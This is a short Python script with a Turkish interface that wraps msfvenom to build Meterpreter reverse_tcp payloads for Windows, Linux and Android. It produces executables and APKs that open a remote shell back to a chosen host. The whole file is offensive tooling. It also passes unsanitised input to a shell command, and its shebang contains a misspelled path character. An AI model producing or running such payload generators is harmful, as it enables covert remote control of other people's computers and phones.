#!/usr/bın/python3
# -*- coding: utf-8 -*-
import subprocess

def show_menu():
    print("Msfvenom Payload Oluşturma Aracı")
    print("-----------------------------")
    print("1. Windows/meterpreter/reverse_tcp")
    print("2. Linux/meterpreter/reverse_tcp")
    print("3. Android/meterpreter/reverse_tcp")
    print("4. Çıkış")

def generate_payload(lhost, lport, payload_type, output_file):
    command = f"msfvenom -p {payload_type} LHOST={lhost} LPORT={lport} -o {output_file}"
    subprocess.call(command, shell=True)

def main():
    lhost = input("Hedef IP adresini girin: ")
    lport = input("Hedef port numarasını girin: ")

    while True:
        show_menu()
        choice = input("Bir seçenek girin: ")

        if choice == "1":
            payload_name = input("Payload adını girin: ")
            output_file = payload_name + ".exe"
            generate_payload(lhost, lport, "windows/meterpreter/reverse_tcp", output_file)
        elif choice == "2":
            payload_name = input("Payload adını girin: ")
            output_file = payload_name + ".bin"
            generate_payload(lhost, lport, "linux/meterpreter/reverse_tcp", output_file)
        elif choice == "3":
            payload_name = input("Payload adını girin: ")
            output_file = payload_name + ".apk"
            generate_payload(lhost, lport, "android/meterpreter/reverse_tcp", output_file)
        elif choice == "4":
            break
        else:
            print("Geçersiz seçenek! Tekrar deneyin.")

if __name__ == "__main__":
    main()
